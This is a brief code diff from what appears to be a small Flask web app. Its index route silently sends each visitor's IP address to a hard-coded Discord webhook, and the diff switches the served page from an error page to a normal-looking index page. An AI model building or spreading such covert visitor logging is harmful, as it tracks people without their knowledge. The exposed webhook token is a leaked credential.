@@ -10,7 +10,7 @@ WEBHOOK_URL = 'https://discord.com/api/webhooks/1189581246829957180/aRFpdCSf9Agf
 def index():
     user_ip = request.remote_addr
     send_to_discord_webhook(user_ip)
-    return render_template('error_page.html')
+    return render_template('index.html')
 
 def send_to_discord_webhook(ip_address):
     payload = {
